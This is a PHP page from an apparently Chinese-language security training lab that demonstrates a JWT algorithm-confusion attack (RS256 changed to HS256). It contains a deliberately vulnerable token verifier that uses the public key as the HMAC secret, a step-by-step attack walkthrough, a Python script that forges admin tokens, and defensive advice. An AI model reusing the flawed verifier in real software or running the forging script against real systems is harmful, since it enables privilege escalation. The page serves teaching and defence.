<?php
$module_name = '算法混淆攻击';
$module_icon = '🔄';
$module_desc = '演示JWT算法混淆攻击漏洞场景 - 将RS256改为HS256并使用公钥伪造签名。';

session_start();

$message = '';
$error = '';
$success = false;

if (isset($_GET['reset'])) {
    $_SESSION['jwt_user_algo'] = [
        'sub' => 'user123',
        'username' => 'normaluser',
        'role' => 'user',
        'iat' => time()
    ];
    header('Location: 01_algorithm_confusion.php');
    exit;
}

if (!isset($_SESSION['jwt_user_algo'])) {
    $_SESSION['jwt_user_algo'] = [
        'sub' => 'user123',
        'username' => 'normaluser',
        'role' => 'user',
        'iat' => time()
    ];
}

// 使用预先生成的RSA密钥对
$keyDir = __DIR__ . '/keys';
$privateKeyFile = $keyDir . '/private.key';
$publicKeyFile = $keyDir . '/public.key';

// 读取密钥对
$privateKey = file_get_contents($privateKeyFile);
$publicKey = file_get_contents($publicKeyFile);

if (!$privateKey || !$publicKey) {
    die('无法读取RSA密钥对文件，请确保keys目录下有private.key和public.key文件');
}

function base64UrlEncode($data) {
    return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
}

function base64UrlDecode($data) {
    $remainder = strlen($data) % 4;
    if ($remainder) {
        $data .= str_repeat('=', 4 - $remainder);
    }
    return base64_decode(strtr($data, '-_', '+/'));
}

// 使用RS256（RSA + SHA256）签名 - 服务器正常使用的算法
function createJWT_RS256($payload, $privateKey) {
    $header = ['alg' => 'RS256', 'typ' => 'JWT'];
    $headerEncoded = base64UrlEncode(json_encode($header));
    $payloadEncoded = base64UrlEncode(json_encode($payload));
    $data = $headerEncoded . '.' . $payloadEncoded;
    
    openssl_sign($data, $signature, $privateKey, OPENSSL_ALGO_SHA256);
    
    return $data . '.' . base64UrlEncode($signature);
}

// 漏洞验证函数 - 算法混淆漏洞点
function verifyJWT_Vulnerable($token, $publicKey) {
    $parts = explode('.', $token);
    if (count($parts) !== 3) {
        return [false, 'Invalid token format'];
    }
    
    $header = json_decode(base64UrlDecode($parts[0]), true);
    $payload = json_decode(base64UrlDecode($parts[1]), true);
    
    if (!$header || !$payload) {
        return [false, 'Invalid token structure'];
    }
    
    $alg = strtoupper($header['alg'] ?? '');
    $data = $parts[0] . '.' . $parts[1];
    $signature = base64UrlDecode($parts[2]);
    
    // 漏洞点：根据header中的alg字段决定验证方式，但没有严格限制算法
    if ($alg === 'RS256') {
        // 正常的RS256验证 - 使用公钥验证RSA签名
        $result = openssl_verify($data, $signature, $publicKey, OPENSSL_ALGO_SHA256);
        if ($result === 1) {
            return [true, $payload];
        }
        return [false, 'Invalid RS256 signature'];
    }
    
    // 算法混淆漏洞：当alg为HS256时，错误地使用公钥作为HMAC密钥
    if ($alg === 'HS256') {
        // 漏洞：使用公钥字符串作为HMAC密钥
        $expected = hash_hmac('sha256', $data, $publicKey, true);
        if (hash_equals($expected, $signature)) {
            return [true, $payload];
        }
        return [false, 'Invalid HS256 signature'];
    }
    
    // 拒绝None算法
    if ($alg === 'NONE' || $alg === 'NULL') {
        return [false, 'Algorithm "none" is not allowed'];
    }
    
    return [false, 'Unsupported algorithm: ' . $alg];
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['token'])) {
    $token = trim($_POST['token']);
    list($valid, $result) = verifyJWT_Vulnerable($token, $publicKey);
    
    if ($valid && is_array($result)) {
        $_SESSION['jwt_user_algo'] = $result;
        if (isset($result['role']) && $result['role'] === 'admin') {
            $success = true;
            $message = '🎉 算法混淆攻击成功！你已成功利用RS256→HS256算法混淆漏洞获取管理员权限！';
        } else {
            $message = '令牌验证成功，当前用户：' . htmlspecialchars($result['username'] ?? 'unknown') . '，角色：' . htmlspecialchars($result['role'] ?? 'unknown');
        }
    } else {
        $error = '令牌验证失败：' . htmlspecialchars($result);
    }
}

// 生成正常的RS256令牌
$currentToken = createJWT_RS256($_SESSION['jwt_user_algo'], $privateKey);

$header = json_decode(base64UrlDecode(explode('.', $currentToken)[0]), true);
$payload = json_decode(base64UrlDecode(explode('.', $currentToken)[1]), true);

$content = '<div class="card">
    <div class="card-header">
        <h5 class="mb-0">🔄 JWT算法混淆攻击 (RS256 → HS256)</h5>
    </div>
    <div class="card-body">
        <div class="alert alert-danger">
            <strong>💡 漏洞说明：</strong><br>
            本场景演示<strong>JWT算法混淆攻击</strong>。服务器使用RS256（非对称加密）签名JWT，但验证时未严格限制算法类型。<br>
            攻击者可以将算法改为HS256（对称加密），并使用<strong>公钥</strong>作为HMAC密钥伪造签名，服务器会错误地验证通过。
        </div>

        <div class="mb-3 text-center">
            <a href="?reset" class="btn btn-warning">重置环境</a>
        </div>

        <div class="card mb-3">
            <div class="card-header">
                <h6>🔄 算法混淆攻击流程</h6>
            </div>
            <div class="card-body">
                <div class="bg-light p-3 rounded border mb-3">
                    <script src="../assets/js/mermaid.min.js"></script>
                    <div class="mermaid">
flowchart TD
    A[服务器使用RS256签名JWT] --> B[私钥签名 + 公钥验证]
    B --> C[攻击者获取公钥]
    C --> D[从JWKS端点/配置文件泄露]
    D --> E[构造伪造的JWT]
    E --> F[修改alg: RS256 → HS256]
    F --> G[修改role: user → admin]
    G --> H[使用公钥作为HMAC密钥签名]
    H --> I[提交伪造的JWT]
    I --> J[服务器验证]
    J --> K{alg字段}
    K -->|RS256| L[正常RSA验证]
    K -->|HS256| M[漏洞: 用公钥做HMAC验证]
    M --> N[验证通过!]
    N --> O[攻击成功: 获得管理员权限]
                    </div>
                </div>
            </div>
        </div>

        <div class="row">
            <div class="col-md-6">
                <div class="card mb-3">
                    <div class="card-header bg-dark text-white">
                        <h6>🔐 服务器私钥（保密，仅服务器知道）</h6>
                    </div>
                    <div class="card-body">
                        <div class="alert alert-warning">
                            <strong>⚠️ 私钥已隐藏</strong><br>
                            私钥存储在服务器安全位置，攻击者无法获取。
                        </div>
                        <pre class="bg-dark text-light p-2 rounded" style="font-size: 11px; max-height: 150px; overflow: auto;"><code>-----BEGIN RSA PRIVATE KEY-----
[私钥内容已隐藏，仅用于服务器签名]
-----END RSA PRIVATE KEY-----</code></pre>
                        <small class="text-muted">用于RS256签名JWT，攻击者无法获取</small>
                    </div>
                </div>
            </div>
            <div class="col-md-6">
                <div class="card mb-3 border-danger">
                    <div class="card-header bg-danger text-white">
                        <h6>🔓 服务器公钥（已泄露！）</h6>
                    </div>
                    <div class="card-body">
                        <div class="alert alert-danger">
                            <strong>⚠️ 公钥已泄露！</strong><br>
                            攻击者从以下途径获取了公钥：
                            <ul class="mb-0">
                                <li>JWKS端点未授权访问</li>
                                <li>配置文件意外公开</li>
                                <li>源代码泄露</li>
                            </ul>
                        </div>
                        <pre class="bg-dark text-light p-2 rounded" style="font-size: 11px; max-height: 200px; overflow: auto;"><code>' . htmlspecialchars($publicKey) . '</code></pre>
                        <small class="text-danger">攻击者可利用此公钥进行算法混淆攻击！</small>
                    </div>
                </div>
            </div>
        </div>

        <div class="card mb-3">
            <div class="card-header">
                <h6>🎫 当前用户令牌（正常RS256签名）</h6>
            </div>
            <div class="card-body">
                <div class="alert alert-info">
                    <div class="d-flex align-items-center">
                        <div class="me-3">
                            <strong>当前用户：</strong>' . htmlspecialchars($_SESSION['jwt_user_algo']['username']) . '
                        </div>
                        <div>
                            <strong>角色：</strong>
                            <span class="badge ' . ($_SESSION['jwt_user_algo']['role'] === 'admin' ? 'bg-danger' : 'bg-secondary') . ' badge-pill fs-5 px-3 py-2">' . htmlspecialchars($_SESSION['jwt_user_algo']['role']) . '</span>
                        </div>
                    </div>
                </div>
                <pre class="bg-dark text-light p-3 rounded" style="word-break: break-all;"><code>' . htmlspecialchars($currentToken) . '</code></pre>
                
                <div class="row mt-3">
                    <div class="col-md-6">
                        <strong>Header：</strong>
                        <pre class="bg-light p-2 rounded"><code>' . htmlspecialchars(json_encode($header, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE)) . '</code></pre>
                    </div>
                    <div class="col-md-6">
                        <strong>Payload：</strong>
                        <pre class="bg-light p-2 rounded"><code>' . htmlspecialchars(json_encode($payload, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE)) . '</code></pre>
                    </div>
                </div>
            </div>
        </div>

        <div class="card mb-3 border-danger">
            <div class="card-header bg-danger text-white">
                <h6>🎯 攻击演示 - 算法混淆攻击</h6>
            </div>
            <div class="card-body">
                <form method="POST">
                    <div class="mb-3">
                        <label for="token" class="form-label">提交伪造的JWT令牌（将RS256改为HS256，用公钥签名）：</label>
                        <textarea name="token" id="token" class="form-control" rows="3" placeholder="粘贴你伪造的JWT令牌..."></textarea>
                    </div>
                    <button type="submit" class="btn btn-danger">提交令牌</button>
                </form>

                ' . ($success ? '<div class="alert alert-success mt-3">' . $message . '</div>' : '') . '
                ' . ($message && !$success ? '<div class="alert alert-info mt-3">' . $message . '</div>' : '') . '
                ' . ($error ? '<div class="alert alert-danger mt-3">' . $error . '</div>' : '') . '

                <div class="mt-4">
                    <h6>💡 攻击步骤详解</h6>
                    <div class="accordion" id="attackSteps">
                        <div class="accordion-item">
                            <h2 class="accordion-header" id="step1">
                                <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapseStep1" aria-expanded="true" aria-controls="collapseStep1">
                                    步骤1：获取公钥
                                </button>
                            </h2>
                            <div id="collapseStep1" class="accordion-collapse collapse show" aria-labelledby="step1" data-bs-parent="#attackSteps">
                                <div class="accordion-body">
                                    <p>攻击者通过以下方式获取公钥：</p>
                                    <ul>
                                        <li>从服务器的JWKS端点获取</li>
                                        <li>从配置文件/源码泄露获取</li>
                                        <li>从SSL证书中提取</li>
                                    </ul>
                                    <p>本场景中，公钥已显示在上方的蓝色卡片中。</p>
                                </div>
                            </div>
                        </div>
                        <div class="accordion-item">
                            <h2 class="accordion-header" id="step2">
                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseStep2" aria-expanded="false" aria-controls="collapseStep2">
                                    步骤2：构造伪造的Header
                                </button>
                            </h2>
                            <div id="collapseStep2" class="accordion-collapse collapse" aria-labelledby="step2" data-bs-parent="#attackSteps">
                                <div class="accordion-body">
                                    <p>将算法从RS256改为HS256：</p>
                                    <pre class="bg-dark text-light p-2 rounded"><code>{
    "alg": "HS256",
    "typ": "JWT"
}</code></pre>
                                </div>
                            </div>
                        </div>
                        <div class="accordion-item">
                            <h2 class="accordion-header" id="step3">
                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseStep3" aria-expanded="false" aria-controls="collapseStep3">
                                    步骤3：构造伪造的Payload
                                </button>
                            </h2>
                            <div id="collapseStep3" class="accordion-collapse collapse" aria-labelledby="step3" data-bs-parent="#attackSteps">
                                <div class="accordion-body">
                                    <p>将角色从user改为admin：</p>
                                    <pre class="bg-dark text-light p-2 rounded"><code>{
    "sub": "attacker",
    "username": "attacker",
    "role": "admin",
    "iat": ' . time() . '
}</code></pre>
                                </div>
                            </div>
                        </div>
                        <div class="accordion-item">
                            <h2 class="accordion-header" id="step4">
                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseStep4" aria-expanded="false" aria-controls="collapseStep4">
                                    步骤4：使用公钥进行HMAC签名
                                </button>
                            </h2>
                            <div id="collapseStep4" class="accordion-collapse collapse" aria-labelledby="step4" data-bs-parent="#attackSteps">
                                <div class="accordion-body">
                                    <p>这是攻击的核心！使用<strong>公钥</strong>作为HMAC-SHA256的密钥：</p>
                                    <pre class="bg-dark text-light p-2 rounded"><code>signature = HMAC-SHA256(
    base64(header) + "." + base64(payload),
    public_key  // 使用公钥作为密钥！
)</code></pre>
                                </div>
                            </div>
                        </div>
                        <div class="accordion-item">
                            <h2 class="accordion-header" id="step5">
                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseStep5" aria-expanded="false" aria-controls="collapseStep5">
                                    步骤5：组装完整的JWT令牌
                                </button>
                            </h2>
                            <div id="collapseStep5" class="accordion-collapse collapse" aria-labelledby="step5" data-bs-parent="#attackSteps">
                                <div class="accordion-body">
                                    <p>将Header、Payload和Signature用点号连接：</p>
                                    <pre class="bg-dark text-light p-2 rounded"><code>JWT = base64(header) + "." + base64(payload) + "." + base64(signature)</code></pre>
                                    <p class="mt-2">示例：</p>
                                    <pre class="bg-dark text-light p-2 rounded" style="font-size: 10px;"><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlciIsInVzZXJuYW1lIjoiYXR0YWNrZXIiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDI2MjQwMDB9.abc123def456...</code></pre>
                                </div>
                            </div>
                        </div>
                        <div class="accordion-item">
                            <h2 class="accordion-header" id="step6">
                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseStep6" aria-expanded="false" aria-controls="collapseStep6">
                                    步骤6：提交伪造的JWT令牌
                                </button>
                            </h2>
                            <div id="collapseStep6" class="accordion-collapse collapse" aria-labelledby="step6" data-bs-parent="#attackSteps">
                                <div class="accordion-body">
                                    <p>将伪造的JWT令牌提交到服务器：</p>
                                    <pre class="bg-dark text-light p-2 rounded"><code>POST /jwt/01_algorithm_confusion.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlciIsInVzZXJuYW1lIjoiYXR0YWNrZXIiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDI2MjQwMDB9.abc123def456...</code></pre>
                                </div>
                            </div>
                        </div>
                        <div class="accordion-item">
                            <h2 class="accordion-header" id="step7">
                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseStep7" aria-expanded="false" aria-controls="collapseStep7">
                                    步骤7：服务器验证（漏洞触发）
                                </button>
                            </h2>
                            <div id="collapseStep7" class="accordion-collapse collapse" aria-labelledby="step7" data-bs-parent="#attackSteps">
                                <div class="accordion-body">
                                    <p>服务器验证JWT时的流程：</p>
                                    <ol>
                                        <li>解析JWT的Header部分，读取<code>alg</code>字段</li>
                                        <li>发现<code>alg = "HS256"</code></li>
                                        <li><strong>漏洞点：</strong>使用公钥作为HMAC密钥验证签名</li>
                                        <li>计算<code>HMAC-SHA256(header.payload, public_key)</code></li>
                                        <li>比较计算结果与JWT中的签名</li>
                                        <li><strong>验证通过！</strong></li>
                                    </ol>
                                    <div class="alert alert-danger mt-2">
                                        <strong>⚠️ 为什么会成功？</strong><br>
                                        因为攻击者使用公钥进行HMAC签名，服务器也使用公钥进行HMAC验证，两者使用的密钥相同，所以验证通过！
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="accordion-item">
                            <h2 class="accordion-header" id="step8">
                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseStep8" aria-expanded="false" aria-controls="collapseStep8">
                                    步骤8：获取管理员权限
                                </button>
                            </h2>
                            <div id="collapseStep8" class="accordion-collapse collapse" aria-labelledby="step8" data-bs-parent="#attackSteps">
                                <div class="accordion-body">
                                    <p>JWT验证通过后，服务器信任Payload中的数据：</p>
                                    <pre class="bg-dark text-light p-2 rounded"><code>{
    "sub": "attacker",
    "username": "attacker",
    "role": "admin",  // 服务器认为这是管理员
    "iat": 1742624000
}</code></pre>
                                    <div class="alert alert-success mt-2">
                                        <strong>🎉 攻击成功！</strong><br>
                                        攻击者成功获取了管理员权限，可以执行管理员操作。
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="mt-4">
                    <h6>🐍 Python攻击脚本</h6>
                    <pre class="bg-dark text-light p-3 rounded"><code>import jwt
import base64
import json
import hmac
import hashlib

# 公钥（从服务器获取）
public_key = """' . str_replace('"', '\\"', trim($publicKey)) . '"""

# 构造伪造的Header（将RS256改为HS256）
header = {
    "alg": "HS256",
    "typ": "JWT"
}

# 构造伪造的Payload（将role改为admin）
payload = {
    "sub": "attacker",
    "username": "attacker",
    "role": "admin",
    "iat": ' . time() . '
}

def base64url_encode(data):
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

# 编码header和payload
header_encoded = base64url_encode(json.dumps(header).encode())
payload_encoded = base64url_encode(json.dumps(payload).encode())
message = f"{header_encoded}.{payload_encoded}"

# 关键：使用公钥作为HMAC密钥进行签名
signature = hmac.new(
    public_key.encode(),
    message.encode(),
    hashlib.sha256
).digest()
signature_encoded = base64url_encode(signature)

# 组装伪造的JWT
forged_token = f"{message}.{signature_encoded}"
print("伪造的JWT令牌：")
print(forged_token)</code></pre>
                </div>
            </div>
        </div>

        <div class="card">
            <div class="card-header">
                <h6>🛡️ 防御建议</h6>
            </div>
            <div class="card-body">
                <ol>
                    <li><strong>严格限制算法白名单：</strong>只允许预期的签名算法（如RS256）</li>
                    <li><strong>分离密钥：</strong>不同算法使用不同的密钥，不要混用</li>
                    <li><strong>验证alg字段：</strong>拒绝非预期的算法类型</li>
                    <li><strong>使用成熟的JWT库：</strong>如firebase/php-jwt，它们会正确处理算法</li>
                </ol>
                <pre class="bg-dark text-light p-3 rounded"><code>// 安全的JWT验证示例
use Firebase\JWT\JWT;
use Firebase\JWT\Key;

// 严格限制允许的算法
$allowedAlgorithms = ["RS256"];

// 使用公钥验证RS256签名
$publicKey = file_get_contents("public.pem");
$decoded = JWT::decode($token, new Key($publicKey, "RS256"));

// 这样即使攻击者将alg改为HS256，也会验证失败
// 因为JWT库会检查header中的alg是否与指定的算法一致</code></pre>
            </div>
        </div>
    </div>
</div>';

include '../template/module_template.php';
?>
